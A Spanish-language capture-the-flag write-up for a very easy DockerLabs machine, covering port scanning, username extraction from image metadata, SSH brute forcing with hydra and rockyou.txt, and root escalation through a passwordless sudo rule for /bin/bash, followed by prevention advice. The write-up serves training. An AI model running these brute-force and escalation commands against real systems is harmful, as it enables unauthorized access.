# 🥚 BorazuwarahCTF - DockerLabs

![Dificultad](https://img.shields.io/badge/Dificultad-Muy%20F%C3%A1cil-green)
![SO](https://img.shields.io/badge/SO-Linux-blue)
![Técnicas](https://img.shields.io/badge/T%C3%A9cnicas-Hydra%20%7C%20Esteganograf%C3%ADa%20%7C%20GTFObins-orange)

## 📌 Resumen

Máquina de nivel **Muy Fácil** de [DockerLabs](https://dockerlabs.es/) que explota:

- **Esteganografía** en una imagen JPEG para extraer un nombre de usuario.
- **Fuerza bruta SSH** con Hydra y `rockyou.txt`.
- **Mala configuración de sudo** que permite ejecutar `/bin/bash` como root
  sin contraseña.

| Fase | Técnica | Resultado |
|------|---------|-----------|
| Reconocimiento | `nmap -p-` | 22, 80 |
| Enumeración web | `curl` + `wget` | Imagen `imagen.jpeg` |
| Esteganografía | `exiftool` | Usuario `borazuwarah` |
| Fuerza bruta | `hydra` + `rockyou.txt` | `borazuwarah:123456` |
| Acceso SSH | `ssh` | Shell como usuario |
| Escalada | `sudo -l` → `sudo /bin/bash` | **root** ✅ |

---

## 🔍 Reconocimiento

### Escaneo de puertos

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2 -oN allPorts
```

**Resultado:**

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 22     | SSH      | OpenSSH (Debian) |
| 80     | HTTP     | Apache httpd 2.4.59 |

### Fingerprinting web

```bash
whatweb http://172.17.0.2
```

**Resultado:**

```
http://172.17.0.2 [200 OK] Apache[2.4.59], HTTPServer[Debian Linux][Apache/2.4.59 (Debian)], IP[172.17.0.2]
```

El servidor es **Apache en Debian** sin backend aparente (web estática).

---

## 🔎 Enumeración

### 1. Análisis del HTML

```bash
curl -s http://172.17.0.2
```

**Resultado:**

```html
<html><body><img src='imagen.jpeg'></body></html>
```

La web solo contiene una **imagen**. Es el único vector de entrada.

### 2. Descarga de la imagen

```bash
wget http://172.17.0.2/imagen.jpeg
```

### 3. Análisis de metadatos

```bash
exiftool imagen.jpeg
```

**Hallazgo:** en los metadatos aparecen dos campos clave:

| Campo | Valor |
|-------|-------|
| **Description** | `--- User: borazuwarah ---` |
| **Title** | `--- Password: ---` |

💡 **Conclusión:** el usuario es `borazuwarah`. La contraseña no está en los
metadatos (el campo está vacío), así que hay que buscarla por otra vía.

> ⚠️ **Nota:** `steghide` extrae un archivo `secreto.txt` con una pista troll
> ("sigue buscando en la imagen"). Es un distractor: la información real está
> en los metadatos, no en la esteganografía.

---

## 💥 Explotación

### 1. Fuerza bruta SSH

Con el usuario `borazuwarah`, se ataca SSH con Hydra y `rockyou.txt`:

```bash
hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
```

**Credenciales obtenidas:**

```
borazuwarah:123456
```

La contraseña se encuentra **en las primeras posiciones** de `rockyou.txt`.

### 2. Acceso SSH

```bash
ssh borazuwarah@172.17.0.2
# password: 123456
```

> ⚠️ Si aparece `WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!`:
> ```bash
> ssh-keygen -R 172.17.0.2
> ```

---

## 🚀 Escalada de privilegios

### 1. Enumeración de sudo

```bash
sudo -l
```

**Salida:**

```
User borazuwarah may run the following commands on 8b47714dad93:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /bin/bash
```

Dos configuraciones **extremadamente permisivas**:

- `(ALL : ALL) ALL` → puede ejecutar cualquier comando como cualquier usuario.
- `(ALL) NOPASSWD: /bin/bash` → puede ejecutar `/bin/bash` como root **sin
  contraseña**.

### 2. Exploit

```bash
sudo /bin/bash
```

Comprobación:

```bash
whoami
# root
```

---

## 📸 Evidencia

<img width="752" height="150" alt="image" src="https://github.com/user-attachments/assets/ac18d48e-2267-4a32-9b75-b14367bbce3b" />




✅ **Máquina comprometida completamente.**

---

## 🧠 Lecciones aprendidas

1. **Los metadatos de imágenes pueden contener usuarios/pistas.** `exiftool`
   es imprescindible en cualquier fase de enumeración.
2. **No todo es esteganografía "profunda".** A veces la pista está en los
   **metadatos visibles**, no en los bits de la imagen.
3. **Los distractores existen.** El archivo `secreto.txt` extraído con
   `steghide` era una pista troll. En CTFs, no te obsesiones con una técnica
   cuando hay otras más simples.
4. **`hydra` + `rockyou.txt`** sigue siendo eficaz en labs con contraseñas
   débiles (`123456` está en las primeras posiciones).
5. **`sudo -l` es lo primero** que se ejecuta tras obtener shell.
6. **`sudo /bin/bash` con `NOPASSWD`** es una escalada trivial, pero muy común
   en máquinas mal configuradas.

---

## 🛡️ ¿Cómo se previene?

1. **Eliminar metadatos de imágenes** antes de subirlas a producción:
   ```bash
   exiftool -all= imagen.jpeg
   ```
2. **No usar contraseñas débiles** (`123456`, `password`, etc.).
3. **Configurar sudo correctamente**: nunca dar `NOPASSWD: /bin/bash` ni
   `(ALL : ALL) ALL` a usuarios sin privilegios.
4. **Restringir el acceso SSH** con claves en lugar de contraseñas.
5. **Aplicar el principio de mínimo privilegio** en todos los servicios.

---

## 🛠️ Herramientas utilizadas

- `nmap`
- `whatweb`
- `curl`
- `wget`
- `exiftool`
- `hydra`
- SSH
- GTFObins

---

## 📚 Referencias

- [DockerLabs](https://dockerlabs.es/)
- [Hydra](https://github.com/vanhauser-thc/thc-hydra)
- [ExifTool](https://exiftool.org/)
- [GTFObins - bash](https://gtfobins.github.io/gtfobins/bash/)

---

**Autor:** [Murmur](https://github.com/murmur403)
**Fecha:** 2026-09-27
